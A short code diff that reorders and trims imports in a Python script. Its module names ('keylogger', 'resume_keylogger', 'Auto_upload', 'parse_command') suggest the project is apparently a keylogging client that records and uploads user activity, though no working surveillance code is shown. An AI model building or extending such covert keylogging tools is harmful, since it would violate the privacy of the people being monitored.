@@ -1,16 +1,13 @@
 #%%
 import json
 import time
-import os
-from logger import log
 
 from clint.commands import parse_command, start_logger
-from clint.drive import got_active, Auto_upload
+from clint.drive import Auto_upload, got_active
 from clint.keylogger import resume_keylogger
 from clint.network import get
 from clint.util import data_store
-from threading import Thread
-
+from logger import log
 
 print(data_store.var.last_user_time)
 #%%
